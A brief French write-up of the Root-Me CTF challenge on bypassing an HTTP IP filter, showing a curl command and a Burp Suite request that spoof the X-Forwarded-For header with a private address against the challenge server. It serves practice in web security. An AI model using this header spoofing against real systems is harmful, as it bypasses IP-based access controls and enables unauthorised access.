Le challenge : https://www.root-me.org/fr/Challenges/Web-Serveur/HTTP-Contournement-de-filtrage-IP

Ici le but va être dans la requete HTTP d'envoyer une autre IP dans l'header 

On utilisera 

‘‘‘
curl 'http://challenge01.root-me.org/web-serveur/ch68/' --header 'X-Forwarded-For: 192.168.1.1'
‘‘‘


Il y a aussi la possibilité de le faire avec Burp suite 

Suffit de rajouter dans le GET  le flag 
‘‘‘
X-Forwarded-For: 192.168.1.1
‘‘‘